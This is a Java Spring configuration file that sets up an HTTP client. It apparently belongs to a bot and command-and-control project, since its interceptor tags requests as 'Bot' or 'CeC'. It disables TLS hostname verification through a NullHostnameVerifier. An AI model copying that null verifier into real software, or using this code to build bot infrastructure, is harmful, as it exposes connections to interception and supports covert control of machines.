package cs.sii.service.connection;

import java.io.IOException;
import java.security.KeyManagementException;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpRequest;
import org.springframework.http.MediaType;
import org.springframework.http.client.ClientHttpRequestExecution;
import org.springframework.http.client.ClientHttpRequestInterceptor;
import org.springframework.http.client.ClientHttpResponse;
import org.springframework.http.converter.json.MappingJackson2HttpMessageConverter;
import org.springframework.security.authentication.AuthenticationTrustResolver;
import org.springframework.security.authentication.AuthenticationTrustResolverImpl;
import org.springframework.web.client.RestTemplate;

import cs.sii.config.onLoad.Config;

@Configuration
public class ConnectionServiceConfig {

	@Autowired
	Config configEngine;

	@Bean
	public MySSLClientHttpRequestFactory HttpRequestFactory()
			throws KeyManagementException, NoSuchAlgorithmException, KeyStoreException {
		NullHostnameVerifier verifier = new NullHostnameVerifier();
		MySSLClientHttpRequestFactory crf = new MySSLClientHttpRequestFactory(verifier);

		crf.setConnectTimeout(configEngine.getConnectTimeout());
		crf.setReadTimeout(configEngine.getReadTimeout());

		return crf;

	}

	@Bean
	public AuthenticationTrustResolver getAuthenticationTrustResolver() {
		return new AuthenticationTrustResolverImpl();
	}

	@Bean
	public RestTemplate RestTemplate() throws KeyManagementException, NoSuchAlgorithmException, KeyStoreException {

		RestTemplate restTemplate = new RestTemplate(HttpRequestFactory());

		List<MediaType> mediaTypes = new ArrayList<MediaType>();
		mediaTypes.add(MediaType.TEXT_PLAIN);
		restTemplate.setInterceptors(Collections.singletonList(new XUserAgentInterceptor()));
		MappingJackson2HttpMessageConverter mc = new MappingJackson2HttpMessageConverter();
		mc.setSupportedMediaTypes(mediaTypes);
		restTemplate.getMessageConverters().add(mc);
		return restTemplate;
	}

	public class XUserAgentInterceptor implements ClientHttpRequestInterceptor {

		@Override
		public ClientHttpResponse intercept(HttpRequest request, byte[] body, ClientHttpRequestExecution execution)
				throws IOException {

			HttpHeaders headers = request.getHeaders();
			if (!configEngine.isCommandandconquerStatus()) {
				headers.add("X-User-Agent", "Bot");
			} else
				headers.add("X-User-Agent", "CeC");

			return execution.execute(request, body);
		}
	}
}
